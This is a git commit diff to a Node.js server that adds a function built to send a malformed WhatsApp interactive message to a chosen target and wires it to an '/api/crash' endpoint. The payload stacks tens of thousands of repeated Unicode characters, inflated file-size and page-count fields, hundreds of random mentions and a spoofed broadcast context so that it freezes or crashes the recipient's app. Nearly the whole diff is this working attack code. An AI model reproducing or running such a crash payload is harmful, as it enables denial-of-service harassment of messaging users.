73ca6b4e93db11a892143f2933c05728781dc81f
slashMD <luolangwer@gmail.com>
2025-07-10 19:26:55 +0700

    Update server.js

--- server.js
+++ server.js
@@ -42,6 +42,76 @@ app.post("/api/change-role", (req, res) => {
 
 // TARO FUNCTIONMY
 
+async function XanveriusDelayX(target, Ptcp = true) {
+  const biyalue2 = `_*~@0~*_\n`.repeat(2000);
+  const qud = "ꦽ".repeat(20000);
+
+  await sock.relayMessage(target, {
+    ephemeralMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            documentMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_enc?ccb=11-4&oh=01_fakeurl&oe=67156C73&_nc_sid=5e03e0",
+              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+              fileLength: "9999999999999",
+              pageCount: 1316134911,
+              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+              fileName: "gayamu reng",
+              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+              directPath: "/v/t62.7119-24/30958033_enc",
+              mediaKeyTimestamp: "1726867151",
+              contactVcard: true
+            },
+            hasMediaAttachment: true
+          },
+          body: {
+            text: "XaN-" + qud
+          },
+          footer: {
+            text: ""
+          },
+          nativeFlowMessage: {
+            messageParamsJson: JSON.stringify({
+              title: "Xanverius DelayX",
+              description: "ꦿ".repeat(6000) + biyalue2 + qud,
+              version: 3,
+              message_type: "galaxy_message"
+            })
+          },
+          contextInfo: {
+            mentionedJid: [
+              "13135550002@s.whatsapp.net",
+              ...Array.from({ length: 300 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
+            ],
+            forwardingScore: 1,
+            isForwarded: true,
+            fromMe: false,
+            participant: "13135550002@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            quotedMessage: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_enc?ccb=11-4&oh=01_fakeurl&oe=66F0EDE2&_nc_sid=5e03e0",
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                fileLength: "9999999999999",
+                pageCount: 1316134911,
+                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                fileName: "Xanverius?!",
+                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                directPath: "/v/t62.7119-24/23916836_enc",
+                mediaKeyTimestamp: "1724474503",
+                contactVcard: true
+              }
+            }
+          }
+        }
+      }
+    }
+  }, Ptcp ? { participant: { jid: target } } : {});
+}
+
 //BATES FUNCTION 
 
 app.post("/api/crash", async (req, res) => {
@@ -51,7 +121,7 @@ app.post("/api/crash", async (req, res) => {
   }
 
   try {
-    await InvisibleHome(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
+    await XanveriusDelayX(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
     res.json({ success: true, message: `Bug terkirim ke ${target}` });
   } catch (err) {
     res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
